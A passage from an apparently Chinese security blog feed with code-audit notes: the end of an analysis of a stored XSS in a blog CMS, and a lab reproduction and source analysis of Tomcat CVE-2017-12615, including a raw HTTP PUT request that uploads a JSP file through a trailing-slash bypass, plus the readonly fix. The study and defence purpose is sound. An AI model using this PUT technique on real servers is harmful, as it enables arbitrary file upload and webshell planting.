punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upload"</span><span class="token punctuation">,</span> <span class="token class-name">UploadController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upgrade"</span><span class="token punctuation">,</span> <span class="token class-name">UpgradeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 16 行可以看到 /api/admin/website 对应到 WebSiteController 类</p><p>查看 WebSiteController 类的代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WebSiteSettingUpdateResponse</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> requestMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">ZrLogUtil</span><span class="token punctuation">.</span><span class="token function">convertRequestBody</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> requestMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> param <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WebSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>param<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> param<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">WebSiteSettingUpdateResponse</span> updateResponse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSiteSettingUpdateResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    updateResponse<span class="token punctuation">.</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> updateResponse<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 2 行可以看到，update 方法会把传输过来的数据存储到 requestMap 对象里，并通过 updateByKV 方法进行数据更新。</p><p>因此这里需要对 updateByKV 进行分析，判断其有没有对输入内容进行过滤。</p><p>查看 updateByKV 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">queryInt</span><span class="token punctuation">(</span><span class="token string">"select siteId from "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" where name=?"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"update "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" set value=? where name=?"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"insert "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">"(`value`,`name`) value(?,?)"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里并没有对数据进行过滤，直接将数据存储到了数据库里。</p><p>接下来分析一下输出的地方</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>site-name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_res.title&#125;<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;rurl&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;_res.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>slogan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;website.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>${website.title} 这种写法也没有做转义，也成为了触发 XSS 的一环。</p><blockquote><p>原文链接：</p><p><a href="https://www.teamssix.com/211220-164519.html">https://www.teamssix.com/211220-164519.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-反射型-XSS&quot;&gt;&lt;a href=&quot;#0x01-反射型-XSS&quot; class=&quot;headerlink&quot; title=&quot;0x01 反射型 XSS&quot;&gt;&lt;/a&gt;0x01 反射型 XSS&lt;/h1&gt;&lt;p&gt;以下代码展示了反射型 XSS 漏洞产生的大概形式&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Tomcat 任意文件写入 CVE-2017-12615</title>
    <link href="https://www.teamssix.com/211216-172616.html"/>
    <id>https://www.teamssix.com/211216-172616.html</id>
    <published>2021-12-16T09:26:16.000Z</published>
    <updated>2021-12-16T09:38:29.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><p>直接 Docker 搭建即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span class="token builtin class-name">cd</span> /vulhub/tomcat/CVE-2017-12615<span class="token function">sudo</span> docker-compose build<span class="token function">sudo</span> docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>直接使用 PUT 发起请求就可以上传任意文件，比如向 /teamssix.jsp/ 发起请求</p><pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;teamssix.jsp&#x2F; HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeContent-Length: 26&lt;%out.print(&quot;TeamsSix&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 201 Content-Length: 0Date: Wed, 15 Dec 2021 07:19:29 GMTConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>服务端返回 201 说明创建成功，访问 /teamssix.jsp 可以看到文件成功被上传</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;teamssix.jsp HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 Set-Cookie: JSESSIONID&#x3D;128419889W27F6C930EF27082B98D9FD; Path&#x3D;&#x2F;; HttpOnlyContent-Type: text&#x2F;html;charset&#x3D;ISO-8859-1Content-Length: 8Date: Wed, 15 Dec 2021 07:19:35 GMTConnection: closeTeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112161721745.png"></p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>Tomcat 在处理时有两个默认的 Servlet，分别为 DefaultServlet 和 JspServlet，具体配置如下：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.catalina.servlets.DefaultServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>listings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>…… <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.jasper.servlet.JspServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>fork<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>xpoweredBy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>……    <span class="token comment">&lt;!-- The mapping for the default servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- The mappings for the JSP servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jspx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从配置文件里可以看到对于后缀为 .jsp 和 .jspx 的请求由 JspServlet 处理，而其他的请求则由 DefaultServlet 处理。</p><p>所以当请求 /teamssix.jsp 时将会由 JspServlet 处理，无法触发漏洞；而请求 /teamssix.jsp/ 将绕过这个限制，交由 DefaultServlet 处理，这时就可以触发漏洞了。</p><p>要想实现一个 Servlet，就需要继承 HTTPServlet，找到 HTTPServlet 文件为 /tomcat/lib/servlet-api.jar!/javax/servlet/http/HttpServlet.class</p><p>在 HTTPServlet 中找到 doPut 方法，然后找到 DefaultServlet 里重写的 doPut 方法路径为tomcat/lib/catalina.jar!/org/apache/catalina/servlets/DefaultServlet.class</p><p>查看 DefaultServlet 的 doPut 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPut</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readOnly<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRelativePath</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebResource</span> resource <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultServlet<span class="token punctuation">.</span>Range</span> range <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseContentRange</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> resourceInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>range <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">File</span> contentFile <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">executePartialPut</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> range<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>                resourceInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>contentFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resourceInputStream <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">204</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resourceInputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 2 行可以看到首先判断 readOnly 是否为真，如果为真则返回 403，因此可以直接把 web.xml 里的 DefaultServlet 的 readonly 由原来的 false 改为 true 就能防御这个漏洞了。</p><p>继续回到 DefaultServlet.class 里，在 DefaultServlet.class 里可以看到有个 write 函数，通过这个 write 函数代码跟踪到 tomcat/lib/catalina.jar!/org/apache/catalina/webresources/DirResourceSet.class 里的 write 函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">InputStream</span> is<span class="token punctuation">,</span> <span class="token keyword">boolean</span> overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkPath</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>is <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"dirResourceSet.writeNpe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isReadOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> dest <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> webAppMount <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getWebAppMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dest <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">file</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">.</span><span class="token 